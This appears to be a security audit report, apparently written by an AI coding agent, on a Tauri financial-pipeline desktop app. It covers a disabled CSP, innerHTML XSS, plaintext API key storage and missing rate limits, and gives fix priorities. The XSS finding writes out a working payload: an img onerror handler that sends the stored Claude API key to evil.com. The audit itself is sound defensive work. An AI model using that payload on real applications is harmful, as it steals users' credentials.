# Security Audit Report - Financial Pipeline Tauri App

**Date:** 2026-01-20
**Auditor:** KALIC (Claude Code)
**Tools Used:** Manual code review, Kali Linux toolset (nmap, sqlmap references)

---

## Executive Summary

| Severity | Count | Status |
|----------|-------|--------|
| **CRITICAL** | 2 | Needs immediate fix |
| **HIGH** | 3 | Needs fix before production |
| **MEDIUM** | 2 | Should fix |
| **LOW** | 2 | Recommended |

---

## CRITICAL Vulnerabilities

### 1. CSP (Content Security Policy) Disabled
**File:** `tauri-app/src-tauri/tauri.conf.json:27`
```json
"security": {
  "csp": null  // CRITICAL: No CSP = XSS attacks trivial
}
```

**Risk:** Without CSP, any XSS vulnerability becomes exploitable. Malicious scripts can:
- Steal API keys from localStorage
- Exfiltrate financial data
- Perform actions as the user

**Fix:** Implement strict CSP (see fixes below)

---

### 2. XSS via innerHTML (26 instances)
**Files:** `tauri-app/src/main.ts` (lines 132, 160, 221, 262, 338, 455, 462, 483, 561, 938, 997, 1008, 1165, etc.)

**Example vulnerable code:**
```typescript
resultsDiv.innerHTML = results.map(r => `
    <div class="ai-result-item" data-type="${r.result_type}">
        <div class="ai-result-content">${r.content}</div>  // DANGEROUS!
    </div>
`).join('');
```

**Risk:** If `r.content` contains `<script>` tags or event handlers, they execute.

**Attack vector:**
1. Attacker creates malicious market event with content: `<img src=x onerror="fetch('https://evil.com?key='+localStorage.getItem('fp_claude_api_key'))">`
2. User searches, content renders
3. API key exfiltrated

---

## HIGH Vulnerabilities

### 3. API Key Stored in localStorage (Plaintext)
**File:** `tauri-app/src/main.ts:1122`
```typescript
localStorage.setItem(CLAUDE_API_KEY_STORAGE, key);
```

**Risk:**
- Any XSS attack can steal the key
- localStorage is not encrypted
- Persists across sessions

**Recommendation:** Use Tauri's secure storage or encrypt before storing

---

### 4. No Rate Limiting on API Calls
**File:** `tauri-app/src-tauri/src/lib.rs`

No rate limiting on `claude_chat` command. Attacker could:
- Drain API credits rapidly
- Cause denial of wallet attack

---

### 5. No Input Validation on User Queries
**File:** `src/claude.rs:140`
```rust
messages.push(ClaudeMessage {
    role: "user".to_string(),
    content: query.to_string(),  // Raw user input
});
```

Prompt injection possible - user could manipulate Claude's behavior.

---

## MEDIUM Vulnerabilities

### 6. No TLS Certificate Pinning
**File:** `src/claude.rs:104`
```rust
let client = Client::builder()
    .timeout(Duration::from_secs(120))
    .build()?;  // No cert pinning
```

**Risk:** MITM attacks on compromised networks could intercept API keys.

---

### 7. Debug Info in Production Builds
**File:** `tauri-app/src-tauri/src/lib.rs:1973`
```rust
if cfg!(debug_assertions) {
    app.handle().plugin(tauri_plugin_log::Builder::default()...
```

While logging is debug-only, error messages may leak sensitive info.

---

## LOW Vulnerabilities

### 8. Overly Permissive CORS (If web version)
Not applicable for desktop Tauri, but note for future web deployment.

### 9. No API Key Format Validation
```typescript
if (key) {
    localStorage.setItem(CLAUDE_API_KEY_STORAGE, key);
```
Should validate key format (sk-ant-...) before storing.

---

## POSITIVE Findings

| Finding | Status |
|---------|--------|
| SQL Injection | **PROTECTED** - Uses parameterized queries (`params![]`) |
| Hardcoded Secrets | **NONE FOUND** |
| TLS to Anthropic | **VALID** - Certificate valid through Feb 2026 |
| Command Injection | **PROTECTED** - No shell execution found |
| Tauri Capabilities | **MINIMAL** - Only core permissions granted |

---

## Recommended Fixes (Priority Order)

### Fix 1: Implement CSP (CRITICAL)
### Fix 2: Sanitize HTML Output (CRITICAL)
### Fix 3: Encrypt API Key Storage (HIGH)
### Fix 4: Add Rate Limiting (HIGH)
### Fix 5: Validate Input Length/Format (MEDIUM)

---

## Implementation Provided

See commits following this report for security hardening implementations.
